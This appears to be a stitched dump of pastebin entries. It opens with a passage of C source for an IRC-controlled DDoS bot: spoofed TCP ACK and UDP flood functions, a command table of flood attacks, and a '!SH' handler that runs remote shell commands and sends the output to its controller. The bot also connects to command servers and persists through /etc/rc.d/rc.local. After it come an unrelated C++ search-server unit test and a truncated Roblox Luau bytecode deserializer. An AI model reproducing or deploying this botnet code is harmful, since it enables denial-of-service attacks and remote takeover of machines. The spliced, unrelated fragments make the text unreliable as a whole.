        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
	dest=htons(atoi(argv[2]));

        Send(sock,""NOTICE %s :Flooding with TCP ACK %s.\n"",sender,argv[1]);

	send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 255;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
	send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
	send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
		saddr=getspoof();
		if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}

void nsackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,""NOTICE %s :NSACKFLOOD <target> <port> <secs>\n"",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,""NOTICE %s :Flooding with TCP ACK %s.\n"",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
                saddr=INADDR_ANY;
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}


void unknown(int sock, char *sender, int argc, char **argv) {
	int flag=1,fd,i;
	unsigned long secs;
	char *buf=(char*)malloc(9216);
 	struct hostent *hp;
	struct sockaddr_in in;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,""NOTICE %s :UNKNOWN <target> <secs>\n"",sender);
                exit(1);
        }
        secs=atol(argv[2]);
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=host2ip(sender,argv[1]);
	in.sin_family = AF_INET;
        Send(sock,""NOTICE %s :Unknowning %s.\n"",sender,argv[1]);
	while(1) {
		in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
			flag=1;
			ioctl(fd,FIONBIO,&flag);
			sendto(fd,buf,9216,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
                if (i >= 50) {
                        if (time(NULL) >= start+secs) break;
                        i=0;
                }
                i++;
	}
        close(fd);
	exit(0);
}
void move(int sock, char *sender, int argc, char **argv) {
        if (argc < 1) {
                Send(sock,""NOTICE %s :MOVE <server>\n"",sender);
                exit(1);
        }
	server=strdup(argv[1]);
	changeservers=1;
	close(sock);
}
void killall(int sock, char *sender, int argc, char **argv) {
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,""NOTICE %s :Killing pid %d.\n"",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}
void killd(int sock, char *sender, int argc, char **argv) {
	if (!disable) kill(0,9);
	else Send(sock,""NOTICE %s :Unable to comply.\n"");
}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
	{ ""RANDOMFLOOD"", randomflood},
	{ ""NSACKFLOOD"", nsackflood },
	{ ""NSSYNFLOOD"", nssynflood },
	{ ""ACKFLOOD"", ackflood },
        { ""SYNFLOOD"", synflood },
        { ""UDP"", udp },
	{ ""UNKNOWN"", unknown },

        { ""NICK"", nickc },
        { ""SERVER"", move },
	{ ""GETSPOOFS"", getspoofs },
        { ""SPOOFS"", spoof },

	{ ""DISABLE"", disable },
        { ""ENABLE"", enable },

        { ""KILL"", killd },
	{ ""GET"", get },
        { ""VERSION"", version },
        { ""KILLALL"", killall },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if (strwildmatch(message,nick)) return;
                message+=i+1;
                if (!strncmp(message,""IRC "",4)) if (disabled) Send(sock,""NOTICE %s :Unable to comply.\n"",sender); else Send(sock,""%s\n"",message+4);
                if (!strncmp(message,""SH "",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,""export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s"",message+3);
                        command=popen(buf,""r"");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,""NOTICE %s :%s\n"",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }
                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]=""\0"";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
        Send(sock,""MODE %s -xi\n"",nick);
        Send(sock,""JOIN %s :%s\n"",chan);
        Send(sock,""WHO %s\n"",nick);
}
void _PING(int sock, char *sender, char *str) {
        Send(sock,""PONG %s\n"",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,""NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n"",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=makestring();
}
void _NICK(int sock, char *sender, char *str) {
	int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
	if (!strcasecmp(sender,nick)) {
		if (*str == ':') str++;
		if (nick) free(nick);
		nick=strdup(str);
	}
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { ""352"", _352 },
        { ""376"", _376 },
        { ""433"", _433 },
        { ""422"", _376 },
        { ""PRIVMSG"", _PRIVMSG },
        { ""PING"", _PING },
	{ ""NICK"", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	if (changeservers == 0) server=servers[rand()%numservers];
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(4040);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}
int main(int argc, char **argv) {
        int on,i;
        char cwd[256],*str;
        FILE *file;
#ifdef STARTUP
	str=""/etc/rc.d/rc.local"";
	file=fopen(str,""r"");
	if (file == NULL) {
		str=""/etc/rc.conf"";
		file=fopen(str,""r"");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,""/"")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,""\""%s%s\""\n"",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,""a"");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
        nick=makestring();
        ident=makestring();
        user=makestring();
        chan=CHAN;
	server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif
	con();
        Send(sock,""NICK %s\nUSER %s localhost localhost :%s\n"",nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,""\n"");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,""*"");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,""ERROR"")) goto sa;
                                str=strtok((char*)NULL,""\n"");
                        }
                }
        }
        return 0;
}

"
BJQQLY5N,unit test search server 2022,Maksim1473,C++,Sunday 18th of February 2024 03:45:58 PM CDT,"const double EPSILON = 1e-6;

// Тест проверяет, что поисковая система исключает стоп-слова при добавлении документов
void TestExcludeStopWordsFromAddedDocumentContent() {
    const int doc_id = 42;
    const string content = ""cat in the city""s;
    const vector<int> ratings = { 1, 2, 3 };
    {
        SearchServer server;
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        const auto found_docs = server.FindTopDocuments(""in""s);
        ASSERT_EQUAL(found_docs.size(), 1u);
        const Document& doc0 = found_docs[0];
        ASSERT_EQUAL(doc0.id, doc_id);
    }

    {
        SearchServer server;
        server.SetStopWords(""in the""s);
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        ASSERT_HINT(server.FindTopDocuments(""in""s).empty(), ""Stop words must be excluded from documents""s);
    }
}

// Проверка поиска добавленного документа
void TestAddAndFindDocument() {
    const int doc_id = 1;
    const string content = ""Hey class lets find this document""s;
    const vector<int> ratings = { 2, 1, -2 };

    SearchServer server;
    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
    vector<Document> res = server.FindTopDocuments(""class find this document"");
    ASSERT_EQUAL(res[0].id, doc_id);
}

// Проверка удаления стоп-слов из текста документа
void TestDeleteStopWordFromDocument() {
    const int doc_id = 2;
    const string content = ""hey class lets delete stop words from this document""s;
    const vector<int> ratings = { 2, 1, -2 };
    {
        SearchServer server;
        server.SetStopWords(""hey from this lets""s);
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        //string res_words = ""class delete stop words document""s;
        vector<string> res = SplitIntoWords(""class delete document stop words""s);    // Алфавитный порядок плюс-слов
        vector<string> words_res;
        DocumentStatus status = DocumentStatus::ACTUAL;
        tie(words_res, status) = server.MatchDocument(""class delete stop words document""s, doc_id);
        ASSERT_HINT(words_res == res, ""Stop-words should be removed from the document"");
    }

    // Проверка пустого списка стоп-слов
    {
        SearchServer server;
        server.SetStopWords(""""s);
        server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
        //string res_words = ""class delete stop words document""s;
        vector<string> res = SplitIntoWords(""class delete document from hey lets stop this words""s);    // Алфавитный порядок плюс-слов
        vector<string> words_res;
        DocumentStatus status = DocumentStatus::ACTUAL;
        tie(words_res, status) = server.MatchDocument(""hey class lets delete stop words from this document""s, doc_id);
        ASSERT_HINT(words_res == res, ""Empty stop-word string error"");
    }
    
}

// Проверка удаления документов, содержащих минус-слова
void TestDeleteDocumentsWithMinusWords() {

    int doc_id = 3;
    string content = ""hey class lets delete minus words from this document""s;
    vector<int> ratings = { 2, 1, -2 };
    string query = ""class delete words -minus document""s;

    SearchServer server;
    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);

    doc_id = 1;
    content = ""Hey class lets find this document""s;
    ratings = { 2, 1, -2 };

    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
    ASSERT_EQUAL_HINT(server.FindTopDocuments(query).size(), 1, ""Not removed document with one minus-word""s);
}

// Проверка матчинга документов
void TestMatchDocument() {
    const int doc_id = 1;
    const string content = ""Hey class lets find this document""s;
    const vector<int> ratings = { 2, 1, -2 };

    SearchServer server;
    server.AddDocument(doc_id, content, DocumentStatus::ACTUAL, ratings);
    vector<string> words_res;
    DocumentStatus status = DocumentStatus::ACTUAL;
    tie(words_res, status) = server.MatchDocument(""class find document -this""s, doc_id);
    ASSERT_HINT(words_res.empty(), ""Document should be deleted when minus-words found"");  // Ожидаем пустой вектор из-за наличия минус-слова

    tie(words_res, status) = server.MatchDocument(""class find document""s, doc_id);
    vector<string> res = { ""class""s, ""document""s, ""find""s };    // алфавитный порядок
    ASSERT_HINT(words_res == res, ""Match document error""s);
}

// Проверка правильности сортировки (по убыванию релевантности)
void TestCorrectSort() {
    SearchServer search_server;
    search_server.SetStopWords(""и в на""s);

    search_server.AddDocument(0, ""белый кот и модный ошейник""s, DocumentStatus::ACTUAL, { 8, -3 });
    search_server.AddDocument(1, ""пушистый кот пушистый хвост""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""ухоженный пёс выразительные глаза""s, DocumentStatus::ACTUAL, { 5, -12, 2, 1 });
    search_server.AddDocument(3, ""ухоженный скворец евгений""s, DocumentStatus::BANNED, { 9 });

    struct Res {
        int id;
        double rel;
    };
    Res res[3] = { {1, 0.693147}, {0, 0.346574}, {2, 0.346574} };
    const string query = ""белый пушистый пёс""s;
    for (auto& doc : search_server.FindTopDocuments(query)) {
        static int i = 0;
        ASSERT_HINT(doc.id == res[i].id || doc.relevance == res[i].rel, ""The sorting should be in descending order""s);
        i++;
    }
}

// Проверка вычисления среднего рейтинга
void TestCalculateAverage() {
    SearchServer search_server;
    search_server.SetStopWords(""и в на""s);

    search_server.AddDocument(0, ""белый кот и модный ошейник""s, DocumentStatus::ACTUAL, { 8, -3 });
    search_server.AddDocument(1, ""пушистый кот пушистый хвост""s, DocumentStatus::ACTUAL, { 7, 2, 7 });

    vector<Document> out = search_server.FindTopDocuments(""белый кот""s);
    vector<Document> res = { {0, 0, 2}, {1, 0, 5} }; // relevance = 0, так как не интересует

    ASSERT_HINT(equal(out.begin(), out.end(), res.begin(), res.end(), [](const Document& lhs, const Document& rhs) {
        return (lhs.id == rhs.id && lhs.rating == rhs.rating);
        }), ""The average rating is calculated incorrectly""s);
}

// Фильтрация результатов поиска с использованием предиката, задаваемого пользователем
void TestPredicateFiltration() {
    SearchServer search_server;
    search_server.SetStopWords(""и в на""s);

    search_server.AddDocument(0, ""белый кот и модный ошейник""s, DocumentStatus::ACTUAL, { 8, -3 });
    search_server.AddDocument(1, ""пушистый кот пушистый хвост""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""ухоженный пёс выразительные глаза""s, DocumentStatus::ACTUAL, { 5, -12, 2, 1 });
    search_server.AddDocument(3, ""ухоженный скворец евгений""s, DocumentStatus::BANNED, { 9 });
    Document res[2] = { {0, 0.173287, 2 }, {2, 0.173287, -1} };

    for (const Document& document : search_server.FindTopDocuments(""пушистый ухоженный кот""s, [](int document_id, DocumentStatus status, int rating) { return document_id % 2 == 0; })) {
        static int i = 0;
        ASSERT(document.id == res[i].id && document.relevance - res[i].relevance < EPSILON&& document.rating == res[i].rating);
        i++;
    }
}

// Функция TestSearchServer является точкой входа для запуска тестов
void TestSearchServer() {
    RUN_TEST(TestExcludeStopWordsFromAddedDocumentContent);
    RUN_TEST(TestAddAndFindDocument);
    RUN_TEST(TestDeleteStopWordFromDocument);
    RUN_TEST(TestDeleteDocumentsWithMinusWords);
    RUN_TEST(TestMatchDocument);
    RUN_TEST(TestCorrectSort);
    RUN_TEST(TestCalculateAverage);
    RUN_TEST(TestPredicateFiltration);
}"
K2Wd0hh2,de,HTDBarsi,Lua,Sunday 18th of February 2024 03:43:50 PM CDT,"local _tostring = tostring
local function tostring(e)
	if typeof(e) == ""userdata"" then
		local mt = getmetatable(e)
		if type(mt) == ""table"" then
			local __type = rawget(mt, ""__type"")
			local t = type(__type)
			if t == ""string"" then
				return __type
			elseif t == ""function"" then
				return __type()
			end
		end
	end
	return _tostring(e)
end

local function deserialize(bytecode)
	local pos = 1
	local reader do
		reader = {}
		function reader:pos() return pos end
		function reader:nextByte()
			local v = string.byte(bytecode, pos, pos)
			pos = pos + 1
			return v
		end
		function reader:nextChar()
			return string.char(reader:nextByte());
		end
		function reader:nextInt()
			local a,b,c,d = reader:nextByte(),reader:nextByte(),reader:nextByte(),reader:nextByte()
			return (
				bit32.bor(
					bit32.lshift(d, 24),
					bit32.bor(
						bit32.lshift(c, 16),
						bit32.bor(
							bit32.lshift(b, 8),
							a)))
			)
		end
		function reader:nextFloat()
			local a,b,c,d = reader:nextChar(),reader:nextChar(),reader:nextChar(),reader:nextChar()
			return string.unpack(""f"",a..b..c..d)
		end
		function reader:nextVarInt()
			local c1, c2, b, r = 0, 0, 0, 0
			repeat
				c1 = reader:nextByte()
				c2 = bit32.band(c1, 0x7F)
				r = bit32.bor(r, bit32.lshift(c2, b))
				b = b + 7
			until not bit32.btest(c1, 0x80)
			return r;
		end
		function reader:nextString()
			local result = """"
			local len = reader:nextVarInt();
			for i = 1, len do
				result = result .. reader:nextChar();
			end
			return result;
		end
		function reader:nextDouble()
			local str = '';
			for i = 1, 8 do
				str = str .. string.char(reader:nextByte());
			end
			return string.unpack(""<d"", str)
		end
	end

	local status = reader:nextByte()
	if (status ~= 0) then
		local protoTable = {}
		local stringTable = {}

		local typeEncodingVersion = reader:nextByte();

		local sizeStrings = reader:nextVarInt()
		for i = 1,sizeStrings do
			stringTable[i] = reader:nextString()
		end

		local sizeProtos = reader:nextVarInt();
		for i = 1,sizeProtos do
			protoTable[i] = { -- pre-initialize an entry
				codeTable = {},
				kTable = {},
				pTable = {},
				smallLineInfo = {},
				largeLineInfo = {}
			}
		end

		for i = 1,sizeProtos do
			local proto = protoTable[i]
			proto.maxStackSize = reader:nextByte()
			proto.numParams = reader:nextByte()
			proto.numUpValues = reader:nextByte()
			proto.isVarArg = reader:nextByte()

			if (status > 3) then
				proto.flags = reader:nextByte()
				proto.typeinfo = reader:nextString()
			end

			proto.sizeCode = reader:nextVarInt()
			for j = 1,proto.sizeCode do
				proto.codeTable[j] = reader:nextInt()
			end

			proto.sizeConsts = reader:nextVarInt();
			for j = 1,proto.sizeConsts do
				local k = {};
				k.type = reader:nextByte();
				if k.type == 1 then -- boolean
					k.value = (reader:nextByte() == 1 and true or false)
				elseif k.type == 2 then -- number
					k.value = reader:nextDouble()
				elseif k.type == 3 then -- string
					k.value = stringTable[reader:nextVarInt()]
				elseif k.type == 4 then -- cache
					k.value = reader:nextInt()
				elseif k.type == 5 then -- table
					k.value = { [""size""] = reader:nextVarInt(), [""ids""] = {} }
					for s = 1,k.value.size do
						table.insert(k.value.ids, reader:nextVarInt() + 1)
					end
				elseif k.type == 6 then -- closure
					k.value = reader:nextVarInt() + 1 -- closure id
				elseif k.type == 7 then -- vector
					local x,y,z,w = reader:nextFloat(),reader:nextFloat(),reader:nextFloat(),reader:nextFloat()
					local proxy = newproxy(true)
					local mt = getmetatable(proxy)
					warn(x,y,z)
					mt.__type = `Vector3.new({x}, {y}, {z})`--string.format(""Vector3.new(%i, %i, %i)"", tonumber(x), tonumber(y), tonumber(z))
					k.value = proxy
				elseif k.type ~= 0 then
					error(string.format(""Unrecognized constant type: %i"", k.type))
				end
				proto.kTable[j] = k
			end

			proto.sizeProtos = reader:nextVarInt();
			for j = 1,proto.sizeProtos do
				proto.pTable[j] = protoTable[reader:nextVarInt() + 1]
			end

			proto.lineDefined = reader:nextVarInt()

			local protoSourceId = reader:nextVarInt()
			proto.source = stringTable[protoSourceId]

			if (reader:nextByte() == 1) then -- Has Line info?
				local compKey = reader:nextVarInt()
				for j = 1,proto.sizeCode do
					proto.smallLineInfo[j] = reader:nextByte()
				end

				local n = bit32.band(proto.sizeCode + 3, -4)
				local intervals = bit32.rshift(proto.sizeCode - 1, compKey) + 1

				for j = 1,intervals do
					proto.largeLineInfo[j] = reader:nextInt()
				end
			end

			if (reader:nextByte() == 1) then -- Has Debug info?
				error'disassemble() can only be called on ROBLOX scripts'
			end
		end

		local mainProtoId = reader:nextVarInt()
		return protoTable[mainProtoId + 1], protoTable, stringTable;
	else
		error(string.format(""Invalid bytecode (version: %i)"", status))
		return nil;
	end
end

local function getluauoptable()
	local caseMultiplier = 227
	local optable = {
		{ [""name""] = ""NOP"", [""type""] = ""none"", [""case""] = 0 },
		{ [""name""] = ""BREAK"", [""type""] = ""none"", [""case""] = 1 },
		{ [""name""] = ""LOADNIL"", [""type""] = ""iA"", [""case""] = 2 },
		{ [""name""] = ""LOADB"", [""type""] = ""iABC"", [""case""] = 3 },
		{ [""name""] = ""LOADN"", [""type""] = ""iABx"", [""case""] = 4 },
		{ [""name""] = ""LOADK"", [""type""] = ""iABx"", [""case""] = 5 },
		{ [""name""] = ""MOVE"", [""type""] = ""iAB"", [""case""] = 6 },
		{ [""name""] = ""GETGLOBAL"", [""type""] = ""iAC"", [""case""] = 7, [""aux""] = true },
		{ [""name""] = ""SETGLOBAL"", [""type""] = ""iAC"", [""case""] = 8, [""aux""] = true },
		{ [""name""] = ""GETUPVAL"", [""type""] = ""iAB"", [""case""] = 9 },
		{ [""name""] = ""SETUPVAL"", [""type""] = ""iAB"", [""case""] = 10 },
		{ [""name""] = ""CLOSEUPVALS"", [""type""] = ""iA"", [""case""] = 11 },
		{ [""name""] = ""GETIMPORT"", [""type""] = ""iABx"", [""case""] = 12, [""aux""] = true },
		{ [""name""] = ""GETTABLE"", [""type""] = ""iABC"", [""case""] = 13 },
		{ [""name""] = ""SETTABLE"", [""type""] = ""iABC"", [""case""] = 14 },
		{ [""name""] = ""GETTABLEKS"", [""type""] = ""iABC"", [""case""] = 15, [""aux""] = true },
		{ [""name""] = ""SETTABLEKS"", [""type""] = ""iABC"", [""case""] = 16, [""aux""] = true },
		{ [""name""] = ""GETTABLEN"", [""type""] = ""iABC"", [""case""] = 17 },
		{ [""name""] = ""SETTABLEN"", [""type""] = ""iABC"", [""case""] = 18 },
		{ [""name""] = ""NEWCLOSURE"", [""type""] = ""iABx"", [""case""] = 19 },
		{ [""name""] = ""NAMECALL"", [""type""] = ""iABC"", [""case""] = 20, [""aux""] = true },
		{ [""name""] = ""CALL"", [""type""] = ""iABC"", [""case""] = 21 },
		{ [""name""] = ""RETURN"", [""type""] = ""iAB"", [""case""] = 22 },
		{ [""name""] = ""JUMP"", [""type""] = ""isBx"", [""case""] = 23 },
		{ [""name""] = ""JUMPBACK"", [""type""] = ""isBx"", [""case""] = 24 },
		{ [""name""] = ""JUMPIF"", [""type""] = ""iAsBx"", [""case""] = 25 },
